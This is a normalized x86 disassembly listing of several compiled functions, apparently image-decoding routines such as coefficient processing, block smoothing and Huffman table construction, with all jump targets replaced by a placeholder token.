mov ecx [ ebp - 0x2c ]
add ecx 0x54
mov [ ebp - 0x2c ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x19c ]
mov eax [ ebp - 0x10 ]
mov ecx [ edx + eax * 4 + 0x4 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2c ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
cmp eax [ edx + 0x1c ]
jae r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ eax + 0x24 ]
mov edx [ ebp - 0x24 ]
lea eax [ edx + ecx * 4 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ ebp - 0x30 ]
add esp 0x14
mov eax [ ebp - 0x20 ]
add eax 0x80
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
add edx [ ecx + 0x24 ]
mov [ ebp - 0x28 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_422180
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xc8 ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x8c ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0xc ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
imul ecx ecx 0x18
push ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x24 ]
jge r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x4c ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dx [ ecx ]
test edx edx
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cx [ eax + 0x2 ]
test ecx ecx
je r-xdata
mov edx [ ebp - 0x18 ]
xor eax eax
mov ax [ edx + 0x10 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dx [ ecx + 0x20 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cx [ eax + 0x12 ]
test ecx ecx
je r-xdata
mov edx [ ebp - 0x18 ]
xor eax eax
mov ax [ edx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8c ]
add eax ecx
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
cmp [ ecx ] 0x0
jge r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x10 ] 0x5
jg r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x18
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x10 ]
mov esi [ ebp - 0x1c ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x54
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
sub_422300
push ebp
mov ebp esp
sub esp 0x15c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x11c ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4 ]
mov [ ebp - 0x3c ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
xor eax eax
mov al [ edx + 0x11 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
cmp edx [ ecx + 0x24 ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x7c ]
cmp eax [ edx + 0x84 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x88 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x88 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x88 ]
cmp ecx [ eax + 0x11c ]
jae r-xdata
mov eax [ ebp - 0x3c ]
xor ecx ecx
mov cl [ eax + 0x30 ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
call [ edx ]
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x16c ] 0x0
sete dl
mov [ ebp - 0x11c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x88 ]
add ecx [ ebp - 0x11c ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x80 ] ecx
jbe r-xdata
mov eax 0x4
mov eax 0x3
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x88 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3c ]
mov eax [ ecx + 0x20 ]
xor edx edx
div [ esi + 0xc ]
mov [ ebp - 0x1c ] edx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
shl eax 0x1
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x48 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x3c ]
add eax 0x54
mov [ ebp - 0x3c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x7c ]
cmp eax [ edx + 0x84 ]
jg r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x48 ] 0x1
mov edx [ ebp - 0x3c ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x88 ] 0x0
jbe r-xdata
push 0x0
mov ecx [ ebp - 0x20 ]
push ecx
push 0x0
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x48 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x20 ]
add esp 0x14
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x44 ] 0x1
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x20 ]
add ecx [ eax + 0xc ]
mov [ ebp - 0x20 ] ecx
push 0x0
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x88 ]
sub ecx 0x1
mov edx [ ebp - 0x3c ]
imul ecx [ edx + 0xc ]
push ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x48 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x20 ]
add esp 0x14
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0xc ]
mov edx [ ebp - 0x24 ]
lea eax [ edx + ecx * 4 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x44 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x1c ]
jge r-xdata
mov edx [ ebp - 0x14 ]
imul edx edx 0x6
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
lea edx [ ecx + edx * 4 ]
mov [ ebp - 0xcc ] edx
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x4c ]
mov [ ebp - 0xd0 ] ecx
mov edx [ ebp - 0xd0 ]
xor eax eax
mov ax [ edx ]
mov [ ebp - 0xd4 ] eax
mov ecx [ ebp - 0xd0 ]
xor edx edx
mov dx [ ecx + 0x2 ]
mov [ ebp - 0xd8 ] edx
mov eax [ ebp - 0xd0 ]
xor ecx ecx
mov cx [ eax + 0x10 ]
mov [ ebp - 0xe0 ] ecx
mov edx [ ebp - 0xd0 ]
xor eax eax
mov ax [ edx + 0x20 ]
mov [ ebp - 0xe8 ] eax
mov ecx [ ebp - 0xd0 ]
xor edx edx
mov dx [ ecx + 0x12 ]
mov [ ebp - 0xe4 ] edx
mov eax [ ebp - 0xd0 ]
xor ecx ecx
mov cx [ eax + 0x4 ]
mov [ ebp - 0xdc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x19c ]
mov ecx [ ebp - 0x14 ]
mov edx [ eax + ecx * 4 + 0x4 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x44 ]
and edx 0xff
test edx edx
je r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx * 4 - 0x4 ]
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x24 ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x1c ]
sub edx 0x1
cmp [ ebp - 0x18 ] edx
jne r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
ja r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov ecx [ ebp - 0x48 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + 0x24 ]
mov eax [ ebp - 0x34 ]
lea ecx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
push 0x1
lea edx [ ebp - 0xc8 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
call sub_420d40
add esp 0xc
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x2c ]
movsx edx [ ecx ]
mov [ ebp - 0xf8 ] edx
mov eax [ ebp - 0xf8 ]
mov [ ebp - 0xf4 ] eax
mov ecx [ ebp - 0xf4 ]
mov [ ebp - 0xf0 ] ecx
mov edx [ ebp - 0x28 ]
movsx eax [ edx ]
mov [ ebp - 0x104 ] eax
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x100 ] ecx
mov edx [ ebp - 0x100 ]
mov [ ebp - 0xfc ] edx
mov eax [ ebp - 0x30 ]
movsx ecx [ eax ]
mov [ ebp - 0x110 ] ecx
mov edx [ ebp - 0x110 ]
mov [ ebp - 0x10c ] edx
mov eax [ ebp - 0x10c ]
mov [ ebp - 0x108 ] eax
mov [ ebp - 0x38 ] 0x0
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + 0x1c ]
sub edx 0x1
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0xcc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x0
je r-xdata
mov edx [ ebp - 0x2c ]
movsx eax [ edx + 0x80 ]
mov [ ebp - 0xf8 ] eax
mov ecx [ ebp - 0x28 ]
movsx edx [ ecx + 0x80 ]
mov [ ebp - 0x104 ] edx
mov eax [ ebp - 0x30 ]
movsx ecx [ eax + 0x80 ]
mov [ ebp - 0x110 ] ecx
mov eax [ ebp - 0xcc ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x114 ] ecx
cmp [ ebp - 0x114 ] 0x0
je r-xdata
movsx ecx [ ebp - 0xc6 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x114 ] ecx
cmp [ ebp - 0x114 ] 0x0
je r-xdata
movsx edx [ ebp - 0xb8 ]
test edx edx
jne r-xdata
mov edx [ ebp - 0xd4 ]
imul edx edx 0x24
mov eax [ ebp - 0xfc ]
sub eax [ ebp - 0x104 ]
imul edx eax
mov [ ebp - 0xec ] edx
cmp [ ebp - 0xec ] 0x0
jl r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x114 ] ecx
cmp [ ebp - 0x114 ] 0x0
je r-xdata
movsx edx [ ebp - 0xa8 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0xd4 ]
imul eax eax 0x24
mov ecx [ ebp - 0xf4 ]
sub ecx [ ebp - 0x10c ]
imul eax ecx
mov [ ebp - 0xec ] eax
cmp [ ebp - 0xec ] 0x0
jl r-xdata
mov eax [ ebp - 0xd8 ]
shl eax 0x7
sub eax [ ebp - 0xec ]
mov ecx [ ebp - 0xd8 ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov eax [ ebp - 0xd8 ]
shl eax 0x7
add eax [ ebp - 0xec ]
mov ecx [ ebp - 0xd8 ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x114 ] ecx
cmp [ ebp - 0x114 ] 0x0
je r-xdata
movsx edx [ ebp - 0xb6 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0xd4 ]
imul eax eax 0x9
mov ecx [ ebp - 0xf4 ]
add ecx [ ebp - 0x10c ]
mov edx [ ebp - 0x100 ]
shl edx 0x1
sub ecx edx
imul eax ecx
mov [ ebp - 0xec ] eax
cmp [ ebp - 0xec ] 0x0
jl r-xdata
mov eax [ ebp - 0xe0 ]
shl eax 0x7
sub eax [ ebp - 0xec ]
mov ecx [ ebp - 0xe0 ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov eax [ ebp - 0xe0 ]
shl eax 0x7
add eax [ ebp - 0xec ]
mov ecx [ ebp - 0xe0 ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x118 ]
neg ecx
mov [ ebp - 0x118 ] ecx
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
jmp r-xdata
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebp - 0xc8 ]
push edx
mov eax [ ebp - 0x3c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ ebp - 0x40 ]
add esp 0x14
mov edx [ ebp - 0xf4 ]
mov [ ebp - 0xf0 ] edx
mov eax [ ebp - 0xf8 ]
mov [ ebp - 0xf4 ] eax
mov ecx [ ebp - 0x100 ]
mov [ ebp - 0xfc ] ecx
mov edx [ ebp - 0x104 ]
mov [ ebp - 0x100 ] edx
mov eax [ ebp - 0x10c ]
mov [ ebp - 0x108 ] eax
mov ecx [ ebp - 0x110 ]
mov [ ebp - 0x10c ] ecx
mov edx [ ebp - 0x28 ]
add edx 0x80
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x2c ]
add eax 0x80
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x30 ]
add ecx 0x80
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x38 ]
add eax [ edx + 0x24 ]
mov [ ebp - 0x38 ] eax
jmp r-xdata
movsx edx [ ebp - 0xc4 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0xd4 ]
imul eax eax 0x5
mov ecx [ ebp - 0xf0 ]
sub ecx [ ebp - 0xf8 ]
sub ecx [ ebp - 0x108 ]
add ecx [ ebp - 0x110 ]
imul eax ecx
mov [ ebp - 0xec ] eax
cmp [ ebp - 0xec ] 0x0
jl r-xdata
mov eax [ ebp - 0xe8 ]
shl eax 0x7
sub eax [ ebp - 0xec ]
mov ecx [ ebp - 0xe8 ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov eax [ ebp - 0xe8 ]
shl eax 0x7
add eax [ ebp - 0xec ]
mov ecx [ ebp - 0xe8 ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x118 ]
neg ecx
mov [ ebp - 0x118 ] ecx
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
jmp r-xdata
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
mov dx [ ebp - 0x118 ]
mov [ ebp - 0xc6 ] dx
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xd4 ]
imul eax eax 0x9
mov ecx [ ebp - 0xfc ]
add ecx [ ebp - 0x104 ]
mov edx [ ebp - 0x100 ]
shl edx 0x1
sub ecx edx
imul eax ecx
mov [ ebp - 0xec ] eax
cmp [ ebp - 0xec ] 0x0
jl r-xdata
mov eax [ ebp - 0xe4 ]
shl eax 0x7
sub eax [ ebp - 0xec ]
mov ecx [ ebp - 0xe4 ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov eax [ ebp - 0xe4 ]
shl eax 0x7
add eax [ ebp - 0xec ]
mov ecx [ ebp - 0xe4 ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x118 ]
neg ecx
mov [ ebp - 0x118 ] ecx
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
jmp r-xdata
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
mov dx [ ebp - 0x118 ]
mov [ ebp - 0xb8 ] dx
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
mov eax [ ebp - 0xdc ]
shl eax 0x7
sub eax [ ebp - 0xec ]
mov ecx [ ebp - 0xdc ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov eax [ ebp - 0xdc ]
shl eax 0x7
add eax [ ebp - 0xec ]
mov ecx [ ebp - 0xdc ]
shl ecx 0x8
cdq
idiv ecx
mov [ ebp - 0x118 ] eax
cmp [ ebp - 0x114 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x118 ]
neg ecx
mov [ ebp - 0x118 ] ecx
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
jmp r-xdata
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
mov dx [ ebp - 0x118 ]
mov [ ebp - 0xa8 ] dx
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
mov ecx [ ebp - 0x118 ]
neg ecx
mov [ ebp - 0x118 ] ecx
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
jmp r-xdata
mov edx 0x1
mov ecx [ ebp - 0x114 ]
shl edx cl
cmp [ ebp - 0x118 ] edx
jl r-xdata
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
mov dx [ ebp - 0x118 ]
mov [ ebp - 0xb6 ] dx
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
mov dx [ ebp - 0x118 ]
mov [ ebp - 0xc4 ] dx
mov eax 0x1
mov ecx [ ebp - 0x114 ]
shl eax cl
sub eax 0x1
mov [ ebp - 0x118 ] eax
sub_422d80
push ebp
mov ebp esp
sub esp 0x578
push ebx
push esi
push edi
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x32
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp [ ebp + 0x10 ] 0x4
jl r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb0 ]
mov [ ebp - 0x538 ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xa0 ]
mov [ ebp - 0x538 ] edx
jmp r-xdata
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x32
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp - 0x538 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x8c ] edx
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
push 0x590
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax ]
add esp 0xc
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
cmp [ ebp - 0x14 ] 0x10
jg r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp + edx - 0x128 ] 0x0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x530 ] 0x0
movsx ecx [ ebp - 0x128 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
movsx edx [ ebp + ecx - 0x128 ]
cmp edx [ ebp - 0x18 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x10 ]
cmp eax 0x100
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
jg r-xdata
mov edx 0x1
mov ecx [ ebp - 0x18 ]
shl edx cl
cmp [ ebp - 0x530 ] edx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x530 ]
mov [ ebp + eax * 4 - 0x52c ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x530 ]
add eax 0x1
mov [ ebp - 0x530 ] eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
mov al [ ebp - 0x14 ]
mov [ ebp + edx - 0x128 ] al
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x10 ] ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x44 ] 0xfffff
push 0x400
push 0x0
mov edx [ ebp - 0x8 ]
add edx 0x90
push edx
call memset
add esp 0xc
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
test eax eax
je r-xdata
mov edx [ ebp - 0x530 ]
shl edx 0x1
mov [ ebp - 0x530 ] edx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x8
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x8
jg r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov [ eax + edx * 4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
sub edx [ ebp + ecx * 4 - 0x52c ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
